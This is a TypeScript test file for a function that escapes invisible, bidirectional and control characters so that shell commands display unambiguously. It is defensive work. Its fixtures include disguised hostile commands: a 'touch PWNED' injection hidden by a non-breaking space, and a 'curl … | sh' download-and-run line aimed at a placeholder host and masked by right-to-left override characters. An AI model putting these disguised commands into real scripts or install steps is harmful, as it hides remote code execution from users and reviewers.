import assert from 'assert';
import { visible } from '../../../src/lib/visible.ts';

const ascii = (text: string) => /^[\u0020-\u007e]*$/.test(text);

describe('visible', () => {
  it('prints printable ASCII as it is: a Windows path and a command with quotes as written', () => {
    for (const text of [
      'npm ci --no-bin-links',
      'uv sync --frozen && node setup.js # ok',
      '/Users/me/project/.claude/skills/report',
      'github.com/o/r:skills/a',
      'D:\\a\\agent-plugin-lifecycle\\.tmp\\home\\.agents\\plugins\\lifecycle-demo',
      'D:\\a\\plugins\\lifecycle-demo:skills/greet',
      "node -e \"require('fs').writeFileSync('x','y')\"",
      'echo "hi"',
    ])
      assert.strictEqual(visible(text), text);
  });

  it('prints anything else as a JSON string: a value starting with a quote, a leading or trailing space, any character outside printable ASCII', () => {
    assert.strictEqual(visible('"quoted" rest'), '"\\"quoted\\" rest"');
    assert.strictEqual(visible('"'), '"\\""');
    assert.strictEqual(visible(' npm ci'), '" npm ci"');
    assert.strictEqual(visible('npm ci '), '"npm ci "');
    assert.strictEqual(visible('/Users/zoë'), '"/Users/zo\\u00EB"');
    assert.strictEqual(visible('x\u{1f600}'), '"x\\uD83D\\uDE00"');
  });

  it('control, bidirectional, invisible and look-alike characters are shown escaped, in pure ASCII', () => {
    const cases: [string, string][] = [
      // a non-breaking space or a combining grapheme joiner before `#` keeps `#` inside a word, so the shell runs `touch PWNED`
      ['echo safe\u00a0# ; touch PWNED', '"echo safe\\u00A0# ; touch PWNED"'],
      ['echo safe\u034f# ; touch PWNED', '"echo safe\\u034F# ; touch PWNED"'],
      // a right-to-left override and isolates can make a terminal show `curl … | sh` as if it sat inside the `#` comment
      ['npm ci #\u202e\u2066 ; curl -s https://e.example/x|sh \u2069\u2066', '"npm ci #\\u202E\\u2066 ; curl -s https://e.example/x|sh \\u2069\\u2066"'],
      ['a b\u200bc\u00adD\u2028E\u2029\ufeff\u2800\ue000\ud800', '"a b\\u200Bc\\u00ADD\\u2028E\\u2029\\uFEFF\\u2800\\uE000\\uD800"'],
      ['touch PWNED;#\r  install: npm ci\u001b[2K\u0085\u007f', '"touch PWNED;#\\r  install: npm ci\\u001B[2K\\u0085\\u007F"'],
    ];
    for (const [text, shown] of cases) {
      assert.strictEqual(visible(text), shown);
      assert.ok(ascii(visible(text)), shown);
    }
  });

  it('is unambiguous: a field starting with a quote is a JSON string and no other is, so a real newline, the literal text \\u000a, a backslash and a newline, and two backslashes and u000a all differ', () => {
    const inputs = ['a\nb', 'a\\u000ab', 'a\\\nb', 'a\\\\u000ab', '"a"', '\\"a\\"'];
    const outputs = inputs.map((input) => visible(input));
    assert.deepStrictEqual(outputs, ['"a\\nb"', 'a\\u000ab', '"a\\\\\\nb"', 'a\\\\u000ab', '"\\"a\\""', '\\"a\\"']);
    assert.strictEqual(new Set(outputs).size, inputs.length);
    assert.ok(outputs.every(ascii));
    // read back as a script would: JSON when it starts with a quote, the text itself otherwise
    for (const [index, text] of inputs.entries()) assert.strictEqual(outputs[index].startsWith('"') ? JSON.parse(outputs[index]) : outputs[index], text);
  });

  it('a field of a result line also takes the JSON-string form when it holds a space; the question and the reason keep their spaces', () => {
    assert.strictEqual(visible('/Users/me/My Project', { field: true }), '"/Users/me/My Project"');
    assert.strictEqual(visible('C:\\Users\\me\\My Project', { field: true }), '"C:\\\\Users\\\\me\\\\My Project"');
    assert.strictEqual(visible('C:\\Users\\me\\project', { field: true }), 'C:\\Users\\me\\project');
    assert.strictEqual(visible('/Users/me/My Project'), '/Users/me/My Project');
    assert.strictEqual(visible('npm ci --no-bin-links'), 'npm ci --no-bin-links');
  });
});
